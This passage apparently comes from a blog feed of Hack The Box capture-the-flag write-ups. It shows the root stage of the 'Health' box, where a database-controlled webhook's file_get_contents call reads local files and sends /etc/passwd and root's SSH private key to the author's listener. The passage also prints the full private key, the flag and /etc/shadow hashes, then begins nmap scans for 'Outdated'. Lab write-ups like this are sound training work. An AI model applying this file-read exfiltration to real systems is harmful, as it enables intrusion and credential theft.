<table class="caption-top table">
<tbody>
<tr class="odd">
<td style="text-align: left;"># Root ### Step 1 As always, start with <code>sudo -l</code> to look for a easy privesc vector.</td>
</tr>
<tr class="even">
<td style="text-align: left;">No dice. Do some manual enumeration and look for anything interesting in <code>~</code>, <code>/opt</code>, <code>/var/log</code>, <code>/var/www/</code>, <code>/tmp</code>, <code>/dev/shm</code> or <code>/</code></td>
</tr>
<tr class="odd">
<td style="text-align: left;">There doesn’t seem to be the case of password reuse, it might be a good idea to dump the database to find more hashes to crack but I think that’s to easy. Instead continue enumerating with pspy64 and/or linPEAS.</td>
</tr>
<tr class="even">
<td style="text-align: left;">Every minute we see the same set of tasks:</td>
</tr>
<tr class="odd">
<td style="text-align: left;">Reading about <code>TRUNCATE</code> I find this: &gt; <a href="https://dev.mysql.com/doc/refman/5.6/en/truncate-table.html" title="13.1.33 TRUNCATE TABLE Statement"><code>TRUNCATE TABLE</code></a> empties a table completely. It requires the <a href="https://dev.mysql.com/doc/refman/5.6/en/privileges-provided.html#priv_drop"><code>DROP</code></a> privilege. &gt; Logically, <a href="https://dev.mysql.com/doc/refman/5.6/en/truncate-table.html" title="13.1.33 TRUNCATE TABLE Statement"><code>TRUNCATE TABLE</code></a> is similar to a <a href="https://dev.mysql.com/doc/refman/5.6/en/delete.html" title="13.2.2 DELETE Statement"><code>DELETE</code></a> statement that deletes all rows, or a sequence of <a href="https://dev.mysql.com/doc/refman/5.6/en/drop-table.html" title="13.1.28 DROP TABLE Statement"><code>DROP TABLE</code></a> and <a href="https://dev.mysql.com/doc/refman/5.6/en/create-table.html" title="13.1.17 CREATE TABLE Statement"><code>CREATE TABLE</code></a> statements.</td>
</tr>
<tr class="even">
<td style="text-align: left;">So why are they truncating table <code>tasks</code> every minute, and what can we do with that information?</td>
</tr>
<tr class="odd">
<td style="text-align: left;">If would make sense that the webhook we create will be put in the <code>tasks</code> table. Create a new webhook/task from the webpage and verify.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>sql mysql&gt; use laravel Database changed mysql&gt; show tables; +------------------------+ | Tables_in_laravel      | +------------------------+ | failed_jobs            | | migrations             | | password_resets        | | personal_access_tokens | | tasks                  | | users                  | +------------------------+ mysql&gt; select * from tasks; +--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+ | id                                   | webhookUrl               | onlyError | monitoredUrl        | frequency   | created_at          | updated_at          | +--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+ | 341fc709-d2c8-48e4-9c41-636656bdfad8 | http://10.10.14.20:8888/ |         0 | http://10.10.14.20/ | */1 * * * * | 2022-08-24 09:46:23 | 2022-08-24 09:46:23 | +--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+</code></td>
</tr>
<tr class="odd">
<td style="text-align: left;">### Step 2 We know that we controll both <code>webhookUrl</code> and <code>monitoredUrl</code>, with the SQL access we are now able to bypass all restrictions from the webpage. So how can we use that to our advantage? Lets look for the php code and see if it gives any hints.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>bash susanne@health:/var/www/html$ grep -rn monitoredUrl [... snip ...] app/Http/Controllers/HealthChecker.php:14:        $res = @file_get_contents($monitoredUrl, false);</code></td>
</tr>
<tr class="odd">
<td style="text-align: left;"><strong>file_get_contents()</strong> – This is going to display the text within file(s) by reading the contents as a string, and will not interpret PHP code for execution. Because of this we can enumerate files on the filesystem, as root, and steal <code>id_rsa</code> or just grab the flag <code>root.txt</code> straight away.</td>
</tr>
<tr class="even">
<td style="text-align: left;">As a PoC, lets try to get <code>/etc/passwd</code> printed to my webhookUrl/PayloadURL:</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><strong>(1).</strong> Create a new webhook:</td>
</tr>
<tr class="even">
<td style="text-align: left;"><img src="https://exploit.se/posts/2022-08-24-htb-writeup-health/images/health03.png" class="img-fluid"></td>
</tr>
<tr class="odd">
<td style="text-align: left;"><strong>(2).</strong> Verify that it exists in <code>laravel.tasks</code>:</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>sql mysql&gt; select * from tasks; +--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+ | id                                   | webhookUrl               | onlyError | monitoredUrl        | frequency   | created_at          | updated_at          | +--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+ | 7ec7e20c-3011-4143-8aef-2e6057086327 | http://10.10.14.20:8888/ |         0 | http://10.10.14.20/ | */1 * * * * | 2022-08-24 11:49:26 | 2022-08-24 11:49:26 | +--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+ 1 row in set (0.00 sec)</code></td>
</tr>
<tr class="odd">
<td style="text-align: left;"><strong>(3).</strong> <a href="https://devhints.io/mysql">Update</a> the entry and change monitoredUrl to wanted file (<code>/etc/passwd</code>):</td>
</tr>
<tr class="even">
<td style="text-align: left;">```sql mysql&gt; update tasks set monitoredUrl = “/etc/passwd”; Query OK, 1 row affected (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 0</td>
</tr>
<tr class="odd">
<td style="text-align: left;">mysql&gt; select * from tasks; +————————————–+————————–+———–+————–+————-+———————+———————+ | id | webhookUrl | onlyError | monitoredUrl | frequency | created_at | updated_at | +————————————–+————————–+———–+————–+————-+———————+———————+ | 7ec7e20c-3011-4143-8aef-2e6057086327 | http://10.10.14.20:8888/ | 0 | /etc/passwd | <em>/1</em> * * * | 2022-08-24 11:49:26 | 2022-08-24 11:49:26 | +————————————–+————————–+———–+————–+————-+———————+———————+ 1 row in set (0.00 sec) ```</td>
</tr>
<tr class="even">
<td style="text-align: left;"><strong>(4).</strong> Wait for the webhook callback and reap the rewards.</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>bash ➜  health python3 webserv.py 8888 [... snip ...] Body: {"webhookUrl":"http:\/\/10.10.14.20:8888\/","monitoredUrl":"\/etc\/passwd","health":"up","body":"root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/var\/run\/ircd:\/usr\/sbin\/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:\/run\/systemd\/netif:\/usr\/sbin\/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:\/run\/systemd\/resolve:\/usr\/sbin\/nologin\nsyslog:x:102:106::\/home\/syslog:\/usr\/sbin\/nologin\nmessagebus:x:103:107::\/nonexistent:\/usr\/sbin\/nologin\n_apt:x:104:65534::\/nonexistent:\/usr\/sbin\/nologin\nlxd:x:105:65534::\/var\/lib\/lxd\/:\/bin\/false\nuuidd:x:106:110::\/run\/uuidd:\/usr\/sbin\/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:\/var\/lib\/misc:\/usr\/sbin\/nologin\nlandscape:x:108:112::\/var\/lib\/landscape:\/usr\/sbin\/nologin\npollinate:x:109:1::\/var\/cache\/pollinate:\/bin\/false\nsshd:x:110:65534::\/run\/sshd:\/usr\/sbin\/nologin\nsusanne:x:1000:1000:susanne:\/home\/susanne:\/bin\/bash\ngogs:x:1001:1001::\/home\/gogs:\/bin\/bash\nmysql:x:111:114:MySQL Server,,,:\/nonexistent:\/bin\/false\n"}</code></td>
</tr>
<tr class="even">
<td style="text-align: left;">### Step 3 The PoC was successful, change file and for persistance purposes grab <code>id_rsa</code>.</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>bash Body: {"webhookUrl":"http:\/\/10.10.14.20:8888\/","monitoredUrl":"\/root\/.ssh\/id_rsa","health":"up","body":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n"}</code></td>
</tr>
<tr class="even">
<td style="text-align: left;">Format the output to file, and grab <code>root.txt</code>. ```bash ➜ health cat unformated-id_rsa —–BEGIN RSA PRIVATE KEY—–+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh86KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua93bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl771WnW9yH7/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x/LUyan++D+83yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB21bLlZQECgYEA9iT13rdKQ/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj6NRFZ1Gfu21kPTCUTK34iX/p/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn37LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ3JRDh4vdFOBGB/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB1ZI4E59+O3Z15VgZ/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR/xkIP/Mog1a+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC/cQbPm60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G—–END RSA PRIVATE KEY—–</td>
</tr>
<tr class="odd">
<td style="text-align: left;">➜ health awk ‘{gsub(/\n/,“”)}1’ unformated-id_rsa &gt;&gt; still-bad-format ➜ health awk ‘{gsub(/\/,““)}1’ still-bad-format &gt; root-id_rsa ➜ health cat root-id_rsa —–BEGIN RSA PRIVATE KEY—– MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE KScDJTrF0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq IMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/ KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH 7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8 W6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae NPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9 t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD C2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl hnqFXpOWB771WnW9yH7/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x/LUyan++D+8 efiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2 1bLlZQECgYEA9iT13rdKQ/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj nVhtw6NRFZ1Gfu21kPTCUTK34iX/p/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3 sqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou fEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q 0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ zkbVWX3JRDh4vdFOBGB/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT rti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB N1ZI4E59+O3Z15VgZ/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD SsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o ++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp UnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR/xkIP/Mog1a vmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU 6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC/cQbPm QeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G —–END RSA PRIVATE KEY—–</td>
</tr>
<tr class="even">
<td style="text-align: left;">➜ health chmod 400 root-id_rsa ➜ health ssh root@health.htb -i root-id_rsa</td>
</tr>
<tr class="odd">
<td style="text-align: left;">root@health:~# id &amp;&amp; cat root.txt uid=0(root) gid=0(root) groups=0(root) b83ed10d472998b7cebf294c7a62719e</td>
</tr>
<tr class="even">
<td style="text-align: left;">root@health:~# cat /etc/shadow root:<img src="https://latex.codecogs.com/png.latex?6">CGK4O3ut$hQTwfTrsIVAL2.wTf.mNzkpipITwSLVjqTw5bN2bnXXQi8QU4lnrlnrBMZ87bzMMQEyuxnlLJIMGhKIFjZBFn/:19130:0:99999:7::: susanne:$6<img src="https://latex.codecogs.com/png.latex?1e4aezQ4">SdT0K.JpwHFrulyYF6iHx.KItM.AjoMmpyUrk.JSb/hit4YHeAJvrjKVZDEx8M9Hts5UE1FgJY.SC1ia3AvBt.:19129:0:99999:7::: gogs:<img src="https://latex.codecogs.com/png.latex?6">PwVrNTkQ$L5f1d4EbQ8d3BtOBhR8fijKDs6Px3x1bFbLHgIauWbdY0IWfYNLacYF0rVWlr6PmnyVza3JsBZunFlE6MF.uB0:19129:0:99999:7::: ```</td>
</tr>
</tbody>
</table>
</section>
<section id="references" class="level2">
<h2 class="anchored" data-anchor-id="references">References</h2>
<ul>
<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials" class="uri">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials</a></li>
<li><a href="https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/" class="uri">https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/</a></li>
<li><a href="https://labs.nettitude.com/blog/introducing-sharpwsus/" class="uri">https://labs.nettitude.com/blog/introducing-sharpwsus/</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment" class="uri">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment</a></li>
</ul>


</section>
</section>

 ]]></description>
  <category>hackthebox</category>
  <category>linux</category>
  <category>webhook</category>
  <category>redirect</category>
  <category>sqli</category>
  <category>gogs</category>
  <category>python</category>
  <category>mysql</category>
  <guid>https://exploit.se/posts/2022-08-24-htb-writeup-health/2022-08-24-htb-writeup-health.html</guid>
  <pubDate>Wed, 24 Aug 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-08-24-htb-writeup-health/images/health_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Outdated - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-08-22-htb-writeup-outdated/2022-08-22-htb-writeup-outdated.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.10.11.175 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span></span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>      STATE SERVICE</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">25/tcp</span>    open  smtp</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/tcp</span>    open  domain</span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">88/tcp</span>    open  kerberos-sec</span>
<span id="cb1-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">135/tcp</span>   open  msrpc</span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">139/tcp</span>   open  netbios-ssn</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">389/tcp</span>   open  ldap</span>
<span id="cb1-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">445/tcp</span>   open  microsoft-ds</span>
<span id="cb1-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">464/tcp</span>   open  kpasswd5</span>
<span id="cb1-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">593/tcp</span>   open  http-rpc-epmap</span>
<span id="cb1-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">636/tcp</span>   open  ldapssl</span>
<span id="cb1-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3268/tcp</span>  open  globalcatLDAP</span>
<span id="cb1-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3269/tcp</span>  open  globalcatLDAPssl</span>
<span id="cb1-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5985/tcp</span>  open  wsman</span>
<span id="cb1-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">8530/tcp</span>  open  unknown</span>
<span id="cb1-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">8531/tcp</span>  open  unknown</span>
<span id="cb1-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9389/tcp</span>  open  adws</span>
<span id="cb1-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49667/tcp</span> open  unknown</span>
<span id="cb1-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49669/tcp</span> open  unknown</span>
<span id="cb1-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49670/tcp</span> open  unknown</span>
<span id="cb1-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49672/tcp</span> open  unknown</span>
<span id="cb1-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49884/tcp</span> open  unknown</span>
<span id="cb1-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49903/tcp</span> open  unknown</span>
<span id="cb1-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49917/tcp</span> open  unknown</span>
<span id="cb1-26"></span>
<span id="cb1-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> 25,53,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49669,49670,49672,49884,49903,49917 10.10.11.175</span>
<span id="cb1-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>      STATE SERVICE       VERSION</span>
<span id="cb1-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">25/tcp</span>    open  smtp          hMailServer smtpd</span>
<span id="cb1-30"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">smtp-commands:</span> mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP</span>
<span id="cb1-31"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span> 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span>
<span id="cb1-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/tcp</span>    open  domain        Simple DNS Plus</span>
<span id="cb1-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">135/tcp</span>   open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">139/tcp</span>   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
<span id="cb1-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">389/tcp</span>   open  ldap          Microsoft Windows Active Directory LDAP <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain:</span> outdated.htb0., Site: Default-First-Site-Name<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-36"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_ssl-date:</span> 2022-08-15T14:52:47+00:00<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+7h00m01s</span> from scanner time.</span>
<span id="cb1-37"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssl-cert:</span> Subject: </span>
<span id="cb1-38"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Subject</span> Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED</span>
<span id="cb1-39"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> valid before: 2022-06-18T05:50:24</span>
<span id="cb1-40"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_Not</span> valid after:  2024-06-18T06:00:24</span>
<span id="cb1-41"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">445/tcp</span>   open  microsoft-ds<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb1-42"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">464/tcp</span>   open  kpasswd5<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb1-43"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">593/tcp</span>   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-44"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">636/tcp</span>   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain:</span> outdated.htb0., Site: Default-First-Site-Name<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-45"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssl-cert:</span> Subject: </span>
<span id="cb1-46"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
